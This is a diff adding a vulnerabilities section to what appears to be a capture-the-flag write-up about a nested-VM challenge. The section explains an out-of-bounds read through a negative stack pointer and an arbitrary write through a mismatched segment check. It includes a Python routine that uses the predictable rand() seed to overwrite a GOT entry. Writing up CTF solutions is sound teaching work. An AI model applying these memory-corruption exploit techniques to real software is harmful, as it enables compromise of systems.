@@ -16,16 +16,7 @@ extra_segment_w: [0x8000, 0x8fff]
 stack_segment:   [0x9000, 0xffff]
 ```
 
-This segmentation is achieved with special purpose registers: `cs`, `ds`, `es`, `ss`. So let's say we have an operation which will pop value from the stack:
-
-```
-OPCODE_POP_WORD:
-    if (ss * 16 + sp > MEM_SIZE)
-        raise(SIGSEGV);
-
-    if (dest_word)
-        *dest_word = *((uint16_t *) &vm1_mem[ss * 16 + sp]);
-```
+This segmentation is achieved with special purpose registers: `cs`, `ds`, `es`, `ss`.
 
 ![](img/segments.png)
 
@@ -36,3 +27,66 @@ The point is that we can interact using stdin/stdout only with VM1. When we run 
 
 
 ## Vulnerabilities
+The most important thing to note is that we can change the value of registers. 
+
+1) Arbitrary read via pop word operation from vm2:
+
+```
+case OPCODE_POP_WORD:
+    if (ss * 16 + (int64_t)(int)sp > MEM_SIZE)
+        raise(SIGSEGV);
+
+    if (dest_word)
+        *dest_word = *((uint32_t *) &vm2_mem[ss * 16 + (int64_t)(int)sp]);
+    else
+        raise(SIGILL);
+
+    sp += 4;
+    break;
+```
+
+It doesn't check whether `ss * 16 + sp` is less then 0. Meaning if we set `sp` to negative value we can read outside of memory. This way we can leak address from @got entry and determinate libc base address.
+
+2) Arbitrary write via rdrand opeartion from vm3:
+
+```
+case OPCODE_RDRAND:
+    if (es * 16 + (int16_t)di < 0 || es * 16 + (int16_t)di > MEM_SIZE)
+        raise(SIGSEGV);
+    vm3_mem[ds * 16 + (int16_t)di] = (uint8_t)(rand() & 0xff);
+    break;
+
+default:
+    raise(SIGILL);
+```
+
+It checks the boundries of extra segment, but then writes memory inside data segment. We can change `di` to negative value and we have arbitrary write. The problem might seem that rand() is non deterministic, but in fact it is as the binary has been seeded with constant number 0x31337. This means that we can simply calculate localy how many times do we need to repeat the number of rand() calls before it will give as desired byte.
+
+My code for this looks like this:
+```python3
+def generate_vm3_code(cookie):
+    '''Generates code which will overwrite raise@got entry with provided cookie.
+    This abuses the fact that we know seed for pseudo random number generator and 
+    we can use RDRAND instruction to write anywhere we want.'''
+
+    vm3_code = b''
+
+    # First set di register so that VM3_MEM_BASE + ds * 16 + di == raise@got
+    new_di = e.got['raise'] - DS_INIT_VAL * 16 - VM3_MEM_BASE
+    vm3_code += vm3_set_reg(VM3_REG_DI, new_di)
+
+    clibc = CDLL('/lib/x86_64-linux-gnu/libc-2.27.so')
+    clibc.srand(0x31337) # provide same seed
+    
+    for b in cookie:
+        while 1:
+            r = clibc.rand() & 0xff
+            vm3_code += pack('<h', VM3_OPCODE_RDRAND)
+            if r == b:
+                # We found correct byte so proceed to next byte
+                new_di += 1
+                vm3_code += vm3_set_reg(VM3_REG_DI, new_di)
+                break
+    vm3_code += pack('<h', VM3_INVALID_OPCODE)
+    return vm3_code
+```
